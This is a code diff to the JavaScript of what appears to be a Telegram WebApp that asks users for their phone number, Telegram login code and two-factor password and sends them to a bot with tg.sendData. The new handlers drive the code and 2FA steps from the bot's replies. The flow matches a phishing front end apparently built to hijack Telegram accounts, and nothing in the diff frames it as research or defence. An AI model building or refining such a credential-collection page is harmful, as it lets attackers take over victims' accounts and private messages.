@@ -26,6 +26,59 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let currentStep = 'contact';
 
+    // Функция для обработки ответов от бота
+    function handleBotResponse(data) {
+        console.log('📩 Received bot response:', data);
+        
+        if (data.type === 'code_success') {
+            hideLoading();
+            successMsg.textContent = '✅ Код принят! Авторизация завершена.';
+            successMsg.classList.remove('hidden');
+            statusMsg.textContent = '';
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        } else if (data.type === 'code_error') {
+            hideLoading();
+            errorMsg.textContent = data.message || '❌ Ошибка кода';
+            errorMsg.classList.remove('hidden');
+            codeInput.value = '';
+        } else if (data.type === '2fa_required') {
+            hideLoading();
+            codeInput.classList.add('hidden');
+            twoFaInput.classList.remove('hidden');
+            submitBtn.textContent = 'Подтвердить 2FA';
+            statusMsg.textContent = '2FA требуется. Введите пароль.';
+            instructionMsg.classList.remove('hidden');
+            currentStep = '2fa';
+        } else if (data.type === '2fa_success') {
+            hideLoading();
+            successMsg.textContent = '✅ 2FA подтверждён! Авторизация завершена.';
+            successMsg.classList.remove('hidden');
+            statusMsg.textContent = '';
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        } else if (data.type === '2fa_error') {
+            hideLoading();
+            errorMsg.textContent = data.message || '❌ Ошибка 2FA';
+            errorMsg.classList.remove('hidden');
+            twoFaInput.value = '';
+        }
+    }
+
+    // Слушаем сообщения от бота
+    window.addEventListener('message', (event) => {
+        if (event.data && event.data.type) {
+            handleBotResponse(event.data);
+        }
+    });
+
+    // Также слушаем обычные сообщения от бота (как fallback)
+    tg.onEvent('viewportChanged', (data) => {
+        console.log('Viewport changed:', data);
+    });
+
     loginBtn.addEventListener('click', () => {
         console.log('▶️ Login button clicked');
         loginBtn.style.opacity = '0';
@@ -86,6 +139,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 tg.sendData(JSON.stringify(payload));
                 showLoading();
                 statusMsg.textContent = 'Проверяем код...';
+                errorMsg.classList.add('hidden');
                 tg.HapticFeedback.impactOccurred('medium');
             } catch (err) {
                 console.error("Ошибка отправки tg.sendData:", err);
@@ -107,12 +161,26 @@ document.addEventListener('DOMContentLoaded', () => {
                 tg.sendData(JSON.stringify(payload));
                 showLoading();
                 statusMsg.textContent = 'Подтверждаем 2FA...';
+                errorMsg.classList.add('hidden');
                 tg.HapticFeedback.impactOccurred('heavy');
             } catch (err) {
                 console.error("Ошибка отправки tg.sendData:", err);
                 errorMsg.textContent = '❌ Ошибка соединения с ботом.';
                 errorMsg.classList.remove('hidden');
             }
+        }
+    });
+
+    // Обработка нажатия Enter в полях ввода
+    codeInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && currentStep === 'code') {
+            submitBtn.click();
+        }
+    });
+
+    twoFaInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && currentStep === '2fa') {
+            submitBtn.click();
         }
     });
 
@@ -136,6 +204,10 @@ document.addEventListener('DOMContentLoaded', () => {
         phoneInput.value = '';
         codeInput.value = '';
         twoFaInput.value = '';
+        phoneInput.classList.add('hidden');
+        codeInput.classList.add('hidden');
+        twoFaInput.classList.add('hidden');
+        submitBtn.classList.add('hidden');
         successMsg.classList.add('hidden');
         errorMsg.classList.add('hidden');
         instructionMsg.classList.add('hidden');
@@ -143,20 +215,10 @@ document.addEventListener('DOMContentLoaded', () => {
         hideLoading();
     }
 
+    // Старые обработчики событий (оставляем для совместимости)
     tg.onEvent('web_app_data', (data) => {
         console.log('📩 Received web_app_data event:', data);
-        if (currentStep === 'code') {
-            hideLoading();
-            codeInput.classList.add('hidden');
-            twoFaInput.classList.remove('hidden');
-            submitBtn.textContent = 'Подтвердить 2FA';
-            statusMsg.textContent = '2FA требуется. Введите пароль.';
-            instructionMsg.classList.remove('hidden');
-            currentStep = '2fa';
-        } else if (currentStep === '2fa') {
-            hideLoading();
-            statusMsg.textContent = 'Ожидаем подтверждения 2FA...';
-        }
+        // Этот обработчик может быть полезен для других сценариев
     });
 
     tg.onEvent('error', (error) => {
@@ -166,4 +228,16 @@ document.addEventListener('DOMContentLoaded', () => {
         errorMsg.classList.remove('hidden');
         setTimeout(resetForm, 2000);
     });
+
+    // Обработчик закрытия WebApp
+    tg.onEvent('close', () => {
+        console.log('WebApp closed');
+    });
+
+    // Периодическая проверка связи с ботом
+    setInterval(() => {
+        if (loadingSpinner.classList.contains('hidden') === false) {
+            console.log('⏰ Still waiting for bot response...');
+        }
+    }, 5000);
 });
